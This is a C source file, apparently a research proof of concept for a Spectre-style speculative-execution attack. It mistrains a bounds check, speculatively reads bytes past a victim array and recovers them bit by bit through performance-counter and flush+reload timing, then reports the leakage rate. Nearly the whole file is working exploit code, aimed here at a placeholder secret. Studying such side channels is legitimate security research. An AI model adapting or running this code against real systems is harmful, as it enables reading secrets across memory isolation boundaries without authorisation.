
#include <assert.h>
#include <emmintrin.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <x86intrin.h>

#include "cacheutils.h"

#define BENIGN_SIZE 5
#define HIT_THRESHOLD 50
//#define ARCHITECTURAL

#define PAGE_SIZE 4096
#define PROBE_SIZE (256 * PAGE_SIZE)
#define CACHE_LINE_SIZE 64

#define SECRET_VALUE "ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#define SECRET_SIZE ((int)sizeof(SECRET_VALUE))
#define NO_BYTES_TO_LEAK (SECRET_SIZE - 1)
//#define NO_BYTES_TO_LEAK 4
//#define SECRET_SIZE 4
#define DEBUG

#define likely(x)    __builtin_expect (!!(x), 1)
#define unlikely(x)  __builtin_expect (!!(x), 0)
#define NOPS_150 asm volatile("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
#define NOPS_10 asm volatile("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop");

__attribute__((align(256)))
int buf_size = BENIGN_SIZE;

uint8_t cache_barrier1[512] = {0};
// init with values as this prevents nasty reordering
char victim[BENIGN_SIZE] = {1, 2, 3, 4, 5};
uint8_t cache_barrier2[512] = {0};
char probe_array[PROBE_SIZE];
uint8_t cache_barrier3[512];
char secret_data[SECRET_SIZE];



void init_poc() {
  srandom(time(NULL));
  for (int i = 0; i < PROBE_SIZE; i++) {
    probe_array[i] = (char)random();
  }
  strncpy(victim, "DTTTT_BENIGN_CONTENT!", BENIGN_SIZE);
  strncpy(secret_data, SECRET_VALUE, SECRET_SIZE);

  // prevent optimizing of cache barriers
  printf("%s", cache_barrier1);
  printf("%s", cache_barrier2);
  printf("%s", cache_barrier3);
}

int average(int* arr, int n) {
  uint64_t sum = 0;
  for (int i = 0; i < n; i++) {
    sum += arr[i];
  }
  return sum / n;
}

uint64_t read_pmc() {
  // architecturally read first counter (counter0)
  int rcx = 0xc1 | 0 << 30;
  rcx = 0x0;
  uint64_t low, high;
  asm volatile("mfence");
  asm volatile("rdpmc" : "=a"(low), "=d"(high) : "c"(rcx));
  asm volatile("mfence");
  return high << 32 | low;
}

#define SPACING 512
#define LEAKAGE_FAILED ((uint64_t)-1)

__attribute__((aligned(4096))) char mem[8][SPACING * 300];
int init = 0;

void init_leak_pmc() {
  memset(mem, 1, sizeof(mem));
  CACHE_MISS = detect_flush_reload_threshold() + 40;
  printf("Cache miss @ %zd\n", CACHE_MISS);
  init = 1;
}

__attribute__((aligned(4096))) uint64_t leak_pmc() {
  if (!init) {
    printf("[!] Call init_leak_pmc() first!\n");
    exit(1);
  }

  int i, j;
  for (j = 0; j < 8; j++) {
    for (i = 0; i < 256; i++) {
      flush(mem[j] + i * SPACING);
    }
  }
  asm volatile("mfence");

  signal(SIGSEGV, trycatch_segfault_handler);

  for (size_t iterations = 0; iterations < 1; iterations++) {
    uint64_t low = 0, high = 0, try = 0;
    size_t start = rdtsc();

    do {
      for (int rep = 0; rep < 1; rep++) {
        if (!setjmp(trycatch_buf)) {
          asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
          asm volatile(
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              :
              : "c"(7331)
              : "memory");
          asm volatile(
              "xor %%ecx, %%ecx\n\t"  // ATTENTION see [1]
              "rdpmc\n\t"
              : "=a"(low), "=d"(high)
              : "c"(0)  // ATTENTION see [1]
              : "memory");
          // [1]: even though this two lines seem redundant they are important!
          //      both together prevent compiler optimizations that lead to
          //      longer data dependencies and prevent the leakage
          asm volatile(
              // byte 1
              "movq %%rax, %%r11\n\t"
              //"shr $8, %%r11\n\t"
              "and $0xff, %%r11\n\t"
              "shl $9, %%r11\n\t"
              "addq %[mem1], %%r11\n\t"
              "movq $1336, 0(%%r11)\n\t"
              :
              : "a"(low), "d"(high), "c"(&mem[3]),
                "b"(&mem[4]), [mem2] "r"(&mem[2]), [mem1] "r"(&mem[1])
              : "memory", "r11", "r12");

          try_abort();
        }
      }

      int hits = 0;
      uint64_t recovered = 0;
      int bytes_to_leak = 1;
      for (j = 1; j < 2; j++) {
        for (i = 1; i < 255; i++) {
          size_t idx = ((i * 167u) + 13u) & 255u;
          size_t delta = flush_reload_t(mem[j] + idx * SPACING);
          if (delta < CACHE_MISS) {
            recovered = idx;
            hits++;
            break;
          }
        }
      }
      if (hits == bytes_to_leak) {
        return recovered;
      }

      try++;
    } while (try < 1);

    size_t end = rdtsc();
    return LEAKAGE_FAILED;
  }
  return LEAKAGE_FAILED;
}

__attribute__((aligned(4096)))
char read_content(int idx, int shift) {
  if (((float)idx >= (float)0 && (float)idx < (float)buf_size)) {
    int tmp = (victim[idx] >> shift) & 1;
    
    asm volatile (
      "mov $1, %%ecx\n\t"
      "mov $1, %%edx\n\t"
      "mov $2, %%ebx\n\t"
      "test %%rax, %%rax\n\t"
      "cmovne %%ebx, %%ecx\n\t"
      "jmp 3f\n\t"
      "1:"
      "movq %%rdx, %%xmm4\n\t"
      "movq %%rdx, %%xmm5\n\t"
      "divps %%xmm4, %%xmm5\n\t"
      "3:"
      "loop 1b\n\t"

      "mov $127, %%rbx\n\t"
      "movq %%rbx, %%xmm4\n\t"

    :: "a"(tmp) : "memory", "rbx", "rcx", "rdx", "xmm4", "xmm5");
    return 0;
  } else
    return 0;
}

int run = 0;

int leak_bit(int offset, int shift, char* leak) {
  // assert that we actually need to access out-of-bound that
  assert(offset > 0 && offset > buf_size);
  int junk = 1337;

  int elapsed[5000] = {0};
  size_t elapsed_items = 0;
  for (int j = 0; j < 50; j++) {
    // train by accessing in-bound
    for (int i = 30; i > 0; i--) {
      junk ^= read_content(0, shift);
    }

    _mm_mfence();
    int x;
    int training_x = shift % BENIGN_SIZE;
    int malicious_x = offset;
    // access pattern: 5 training runs and 1 out-of-bound access
#ifdef ARCHITECTURAL
    uint64_t before = read_pmc();
#else
    uint64_t before = leak_pmc();
#endif

    _mm_clflush(&buf_size);
    // cache victim addr
    maccess(victim + offset);
    junk ^= victim[offset] & 1;
    _mm_mfence();
    // bit magic to prevent using a conditional jump
    x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
    x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
    x = training_x ^ (x & (malicious_x ^ training_x));
    junk ^= read_content(x, shift);
#ifdef ARCHITECTURAL
    uint64_t after = read_pmc();
#else
    uint64_t after = leak_pmc();
    if (before == LEAKAGE_FAILED || after == LEAKAGE_FAILED) {
      continue;
    }
#endif
    if ((int)(after - before) < 0) {
      // remove overflowed measurements
      continue;
    }
    if (x == malicious_x) {
      elapsed[elapsed_items++] = after - before;
    }
  }
#ifdef DEBUG
  for (size_t i = 0; i < elapsed_items; i++) {
    printf("%d,", elapsed[i]);
  }
  printf("\n");
  printf("elapsed_items: %d\n", elapsed_items);
#endif
  float value_avg = average(elapsed, elapsed_items);
  float value_med = median(elapsed, elapsed_items);
  int value_min = min(elapsed, elapsed_items);
#ifdef DEBUG
  printf("run %d -> %f (min: %d - avg: %f)", run, value_med, value_min, value_avg);
#endif
  run++;


  if (value_med > HIT_THRESHOLD) {
    // set bit to 1
#ifdef DEBUG
    printf("  --> setting 1\n");
#endif
    *leak = *leak | (1 << shift);
  } else {
    // set bit to 0
#ifdef DEBUG
    printf("  --> setting 0\n");
#endif
    *leak = *leak & ~(1 << shift);
  }
  return junk;
}


int main() {
  init_poc();
  int junk = 0;
  char leaked[NO_BYTES_TO_LEAK + 1] = {0};

#ifndef ARCHITECTURAL
  init_leak_pmc();
#endif
  int success_counter = 0;
  struct timeval starttime;
  gettimeofday(&starttime, NULL);
  for (int i = 0; i < NO_BYTES_TO_LEAK; i++) {
    char curr_leak = 0;
    int offset = secret_data - victim + i;
    printf("targeting offset %d ('%c')\n", offset, victim[offset]);
    for (int shift = 0; shift < 8; shift++) {
      junk ^= leak_bit(offset, shift, &curr_leak);
      int leaked_bit = (curr_leak >> shift) & 1;
      int actual_bit = (victim[offset] >> shift) & 1;
      if (leaked_bit == actual_bit) success_counter++;
    }
    printf("curr_leak: %c\n", curr_leak);
    leaked[i] = curr_leak;
  }
  struct timeval endtime;
  gettimeofday(&endtime, NULL);

  char expected[NO_BYTES_TO_LEAK + 1] = {0};
  strncpy(expected, secret_data, NO_BYTES_TO_LEAK);
  printf("Expected:\t%s\n", expected);
  printf("Leaked:\t\t%s\n", leaked);

  // stats
  double success_rate_percent = ((double)success_counter / (double)((NO_BYTES_TO_LEAK * 8))) * 100;
  uint64_t usec_elapsed = (endtime.tv_sec - starttime.tv_sec) * 1000000;
  usec_elapsed += endtime.tv_usec - starttime.tv_usec;
  printf("[+] finished with success rate: %d/%d (%.2f%%)\n", success_counter, NO_BYTES_TO_LEAK * 8, success_rate_percent);
  printf("[*] leakage rate: %f bit/s\n", (float)NO_BYTES_TO_LEAK*8/((float)usec_elapsed / (float)1000000));

  return junk;
}
